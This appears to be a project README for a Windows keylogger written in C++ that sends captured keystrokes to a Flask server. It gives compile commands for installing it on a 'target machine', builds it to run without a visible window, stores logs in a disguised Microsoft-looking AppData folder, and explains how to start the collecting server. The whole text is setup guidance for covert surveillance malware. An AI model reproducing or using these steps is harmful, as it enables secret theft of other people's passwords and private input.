# Windows-Keylogger
Keylogger for Windows in C++, reports back to Flask server (Python).

# Installation
## Keylogger
To install the keylogger on the target machine, download the files, then run the following commands:

`mingw32-g++.exe -Wall -fexceptions -g -std=c++11 -mwindows  -c "[path to main.cpp]" -o [path to main.o]`

`mingw32-g++.exe  -o [path to KeyLog.exe] [path to main.o]  -mwindows`

Key logs will be stored in C:\Users\\[USERNAME]\AppData\Roaming\Microsoft\CLR

## Flask
To install the Flask server, with Python 3 and Flask installed (pip3 install Flask), run app.py with the following command:
python3 app.py
